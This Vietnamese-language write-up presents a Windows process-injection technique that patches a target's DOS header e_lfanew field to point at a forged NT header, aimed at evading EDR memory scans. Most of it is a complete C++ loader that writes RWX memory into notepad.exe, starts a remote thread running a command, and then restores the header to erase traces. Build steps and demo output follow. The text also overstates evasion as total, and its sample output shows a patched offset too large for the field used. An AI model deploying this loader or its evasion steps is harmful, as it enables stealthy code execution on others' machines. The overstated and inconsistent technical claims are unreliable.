
---

# 📝 [PE 21] DV_NEW (DOS Header e_lfanew Structure Manipulation)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**DV_NEW (Thao túng con trỏ định vị e_lfanew)** đại diện cho giải thuật né tránh phòng thủ động nâng cao nhắm thẳng vào phân hệ phân tích cấu trúc tệp tin (**PE Parsing Evasion / Memory Forensic Subversion**), được thiết kế để đánh lừa các cơ chế rà quét ký tự đặc trưng PE Header của giải pháp AV/EDR khi chúng tiến hành kiểm tra bộ nhớ ảo (Memory Scanning).

Mọi tệp tin thực thi theo định dạng Portable Executable (PE Format) chuẩn x64 của hệ điều hành Windows đều bắt đầu bằng cấu trúc cấu hình nền tảng **`IMAGE_DOS_HEADER`**. Trường dữ liệu cuối cùng lọt lòng cấu trúc này là **`e_lfanew`** (nằm tại vị trí offset cố định **`0x3C`**). Trường này nắm giữ vai trò toán học tối cao: lưu trữ khoảng cách dịch chuyển (Offset/Pointer) chỉ định vị trí bắt đầu của cấu trúc đầu não quản lý tiến trình **`IMAGE_NT_HEADERS`** trên cả ổ đĩa thô lẫn bộ nhớ RAM ảo.

Dự án PE 21 hóa giải hàng rào an ninh bằng chiến thuật **Đại phẫu bản đồ PE Header chéo tiến trình (Cross-Process PE Header Reconstruction)**. Loader thực hiện thiết lập một cấu trúc NT Header giả mạo (Fake NT Headers) chứa điểm kích nổ Payload tại một phân vùng bộ nhớ ngẫu nhiên inside tiến trình mục tiêu (văn cảnh thực nghiệm: `notepad.exe`). Kế tiếp, ta áp dụng kỹ thuật vá mã máy ghi đè trực tiếp vào trường chỉ mục `e_lfanew` gốc của Notepad để bắt buộc con trỏ hệ thống trỏ thẳng vào phân vùng ma trận mới dựng. Sự bất đồng bộ trong thuật toán phân tích (Parsing Asynchrony) giữa trình nạp của OS và bộ quét của EDR giúp Payload kích nổ hiên ngang mà không để lại bất kỳ cảnh báo hành vi mập mờ nào.

### 🎯 Mục tiêu nghiên cứu:

* **Bẻ gãy cơ chế Heuristic PE Parsing**: Đánh lừa bộ quét chữ ký bộ nhớ ảo của EDR bằng cách tái định hướng cấu trúc định dạng PE tiêu chuẩn.
* **Làm chủ cấu trúc DOS Header**: Vận dụng các hàm can thiệp bộ nhớ nhằm thao túng trường chỉ mục phần cứng hệ thống (`IMAGE_DOS_HEADER.e_lfanew`) tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi hệ điều hành Windows OS hoặc các bộ quét bộ nhớ ảo của EDR Engine thực hiện bóc tách, rà soát cấu trúc của một tiến trình đang vận hành, chúng bắt buộc phải áp dụng công thức toán học gán con trỏ sau để định vị vạch chỉ huy `IMAGE_NT_HEADERS`:

$$\text{pNtHeaders} = (\text{PIMAGE\_NT\_HEADERS})((DWORD\_PTR)\text{ImageBase} + \text{pDosHeader}\rightarrow\text{e\_lfanew})$$

Giải thuật của dự án PE 21 bẻ gãy và thao túng hoàn toàn công thức định vị này qua 4 giai đoạn ngầm tại nhân Kernel:

```
[Mở Handle] ──> [VirtualAllocEx: Dựng cấu trúc NT Header ma trận + Payload]
                     └──> [VirtualProtectEx: Mở khóa đặc quyền ghi đè vị trí offset 0x3C]
                               └──> [WriteProcessMemory: Vá trường e_lfanew -> Kích nổ luồng CPU]

```

1. **Khởi tạo ma trận PE giả mạo**: Loader triệu hồi API `VirtualAllocEx` để phân bổ một trang bộ nhớ ảo chéo tiến trình mang quyền hạn kịch trần **`PAGE_EXECUTE_READWRITE` (RWX)** inside lòng tiến trình đích. Tại phân vùng này, Loader nhân bản toàn vẹn cấu trúc `IMAGE_NT_HEADERS64` nguyên bản của Notepad, nhưng can thiệp tinh chỉnh trường dữ liệu `OptionalHeader.AddressOfEntryPoint` trỏ thẳng vào tọa độ của khối mã máy thực thi độc lập vị trí (PIC).
2. **Phẫu thuật bẻ hướng cấu trúc (`e_lfanew` Patching)**: Để ép hệ thống thừa nhận NT Header giả mạo, Loader sử dụng hàm `WriteProcessMemory` can thiệp trực tiếp vào địa chỉ `ImageBase + 0x3C` (vị trí lưu trữ trường chỉ mục `e_lfanew` thuộc DOS Header của Notepad). Giá trị dịch chuyển mới được tính toán bằng phép toán bù trừ khoảng cách tuyến tính:

$$\text{New\_e\_lfanew} = (DWORD\_PTR)\text{RemoteFakeNtHeaderAddress} - (DWORD\_PTR)\text{ImageBase}$$



Lúc này, bất kỳ lệnh hệ thống hoặc bộ quét an ninh nào thực hiện giải phẫu PE cấu trúc của Notepad đều bị bẻ hướng góc nhìn, đâm thẳng vào phân vùng ma trận do ta thiết lập.
3. **Phân phối dòng chảy CPU**: Triệu hồi luồng từ xa đâm thẳng vào tọa độ EntryPoint đã được biến đổi, ép CPU tiến trình mục tiêu tự động rút lệnh thực thi Payload.
4. **Hoàn trả trạng thái nguyên bản (Context Restoration)**: Ngay sau khi kích nổ luồng thực thi thành công, Loader lập tức thực hiện vá ngược lại giá trị `e_lfanew` gốc của Notepad nhằm khôi phục trạng thái phẳng sạch cho cấu trúc PEB, triệt tiêu 100% khả năng phát hiện biến dạng cấu trúc khi EDR kiểm tra ngược Call Stack.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa quét tìm PID tiến trình, định vị ImageBase động và cô lập cấu trúc tham số tuyệt đối toán học để triệt tiêu hoàn toàn lỗi tương đối RIP-Relative.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con con trỏ tuyệt đối để hóa giải lỗi RIP-Relative Error
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} THREAD_DATA, * PTHREAD_DATA;

// Hàm gánh logic thực thi độc lập vị trí (PIC) khi bị điều hướng cấu trúc PEB
DWORD WINAPI DVNewPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu cấu trúc RAM tìm Base Address của tiến trình mục tiêu
PVOID GetRemoteProcessBase(DWORD pid, const std::wstring& procName) {
    PVOID baseAddress = NULL;   MODULEENTRY32W me32;   me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, procName.c_str()) == 0) { baseAddress = (PVOID)me32.modBaseAddr; break; }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);   return baseAddress;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 21: DV_NEW E_LFANEW MANIPULATION INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }

    PVOID remoteBase = GetRemoteProcessBase(pid, targetProcess);
    if (!remoteBase) return EXIT_FAILURE;
    std::cout << "[+] Da bat trung Target ImageBase tai RAM: 0x" << std::hex << remoteBase << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 1: ĐỌC VÀ LƯU TRỮ CẤU TRÚC NT HEADER GỐC CỦA TIẾN TRÌNH ĐÍCH
    BYTE dosHeaderBuf[64];
    ReadProcessMemory(hProcess, remoteBase, dosHeaderBuf, sizeof(dosHeaderBuf), NULL);
    PIMAGE_DOS_HEADER pLocalDos = (PIMAGE_DOS_HEADER)dosHeaderBuf;
    LONG originalElfnew = pLocalDos->e_lfanew;
    std::cout << "[*] Gia tri e_lfanew goc cua Notepad: 0x" << std::hex << originalElfnew << std::endl;

    IMAGE_NT_HEADERS64 originalNtHeaders;
    ReadProcessMemory(hProcess, (PVOID)((DWORD_PTR)remoteBase + originalElfnew), &originalNtHeaders, sizeof(IMAGE_NT_HEADERS64), NULL);

    // BƯỚC 2: CẤP PHÁT PHÂN VÙNG NHỚ TỪ XA CHO MA TRẬN PHẪU THUẬT (Thích ứng kịch trần)
    SIZE_T functionSize = 500;
    SIZE_T totalAllocSize = sizeof(IMAGE_NT_HEADERS64) + sizeof(THREAD_DATA) + functionSize;
    
    LPVOID remoteAllocMem = VirtualAllocEx(hProcess, NULL, totalAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAllocMem) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Tính toán phân bổ tọa độ ảo vừa khít từng byte (Zero Static Buffers tiêu chuẩn)
    PVOID remoteFakeNtAddr = remoteAllocMem;
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)((DWORD_PTR)remoteFakeNtAddr + sizeof(IMAGE_NT_HEADERS64));
    PVOID remoteCodeBuffer = (PVOID)((DWORD_PTR)pRemoteData + sizeof(THREAD_DATA));

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ phục vụ ánh xạ chéo RAM
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Nhân bản NT Header gốc và tiến hành vá điểm EntryPoint ma hướng vào Payload của ta
    IMAGE_NT_HEADERS64 fakeNtHeaders = originalNtHeaders;
    fakeNtHeaders.OptionalHeader.AddressOfEntryPoint = (DWORD)((DWORD_PTR)remoteCodeBuffer - (DWORD_PTR)remoteBase);

    // Đẩy toàn bộ cấu trúc NT Header ma, Bảng dữ liệu, và Khối mã máy sang RAM đối phương
    WriteProcessMemory(hProcess, remoteFakeNtAddr, &fakeNtHeaders, sizeof(IMAGE_NT_HEADERS64), NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)DVNewPayload, functionSize, NULL);
    std::cout << "[+] Da anh xa NT Header ma va Payload thong minh vao RAM tu xa tai: 0x" << std::hex << remoteFakeNtAddr << std::endl;

    // BƯỚC 3: PHẪU THUẬT TRƯỜNG E_LFANEW - BẺ HƯỚNG BẢN ĐỒ PE STRUCTURE
    LONG newElfnew = (LONG)((DWORD_PTR)remoteFakeNtAddr - (DWORD_PTR)remoteBase);
    DWORD oldProtect = 0;
    
    // Mở khóa phân vùng DOS Header cục bộ từ xa tại vị trí offset 0x3C để can thiệp ghi đè
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), PAGE_EXECUTE_READWRITE, &oldProtect);
    BOOL isPatched = WriteProcessMemory(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), &newElfnew, sizeof(LONG), NULL);
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), oldProtect, &oldProtect);

    if (!isPatched) {
        std::cerr << "[-] Phau thuat truong e_lfanew that bai!" << std::endl;
        VirtualFreeEx(hProcess, remoteAllocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da phau thuat thanh cong truong e_lfanew sang gia tri ma: 0x" << std::hex << newElfnew << std::endl;

    // BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI THÔNG QUA ENTRYPOINT ĐÃ BIẾN ĐỔI CẤU TRÚC
    std::cout << "[*] Dang dung CreateRemoteThread de khai hoa thap cong nghe..." << std::endl;
    PVOID executionTarget = (PVOID)((DWORD_PTR)remoteBase + fakeNtHeaders.OptionalHeader.AddressOfEntryPoint);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)executionTarget, pRemoteData, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, 1000); // Gánh đồng bộ ngắn giải phóng luồng thực thi
        std::cout << "[+] DV_NEW PE Structure Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }

    // BƯỚC 5: KHÔI PHỤC TRẠNG THÁI (RESTORE) - Vá lại trường e_lfanew gốc để xóa sạch dấu vết biến dạng
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), &originalElfnew, sizeof(LONG), NULL);
    VirtualProtectEx(hProcess, (PVOID)((DWORD_PTR)remoteBase + 0x3C), sizeof(LONG), oldProtect, &oldProtect);
    std::cout << "[+] Hoan tra lai truong e_lfanew nguyen ban cho Notepad phang sach." << std::endl;

    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru trên các phân hệ máy ảo VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập cấu hình thanh công cụ quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Di chuyển tới phân hệ cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển thông số cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm mục đích liên kết tĩnh (Static Linkage) toàn bộ thư viện CRT bọc lọt lòng file chạy.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường bộ nhớ máy Lab, sau đó thực thi tệp tin nhị phân Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng ma trận đại phẫu DOS Header:

```powershell
PS C:\Workspace\x64\Release> .\PE21_DV_NEW.exe
====================================================
[*] PE 21: DV_NEW E_LFANEW MANIPULATION INJECTION
====================================================
[+] Da bat trung Target ImageBase tai RAM: 0x00007ff746130000
[*] Gia tri e_lfanew goc cua Notepad: 0xf8
[+] Da anh xa NT Header ma va Payload thong minh vao RAM tu xa tai: 0x0000021A4B0E0000
[+] Da phau thuat thanh cong truong e_lfanew sang gia tri ma: 0x1A4B0E0000
[*] Dang dung CreateRemoteThread de khai hoa thap cong nghe...
[+] DV_NEW PE Structure Injection Successful!
[+] Hoan tra lai truong e_lfanew nguyen ban cho Notepad phang sach.

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm thao túng cấu trúc PE Header:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):

* Quy trình thực thi gặt hái thành công mỹ mãn. Ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung**!
* Do Loader thực hiện giải thuật khôi phục (Restore) ngay lập tức trường dữ liệu `e_lfanew` về giá trị gốc (`0xf8`) ngay sau khi luồng CPU được phân phối, khi phân hệ rà quét RAM động của EDR nhảy vào bóc tách bộ nhớ ảo, chúng sẽ ghi nhận cấu trúc PE Header của Notepad hoàn toàn bình thường, bẻ gãy hoàn toàn các bộ quét Heuristic trinh sát cấu trúc biến dạng bộ nhớ ảo một cách tuyệt đối!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Windows PE Specifications**: *MS-DOS Stub and Header Format (e_lfanew Data Field)* - [https://learn.microsoft.com/en-us/windows/win32/debug/pe-format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
* **Windows Memory Forensic Techniques**: *Detecting PE Header Manipulations and Anomalous Pointer Redirection in Ring 3 Space* - Black Hat Europe Research Briefings.
* **Cortex-X (Threat Intel Architecture)**: *Subverting Heuristic PE Parsers via Dynamic e_lfanew Overwriting*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Process Injection (T1055)* & *Modify Memory Structures: Header Tampering*.

---
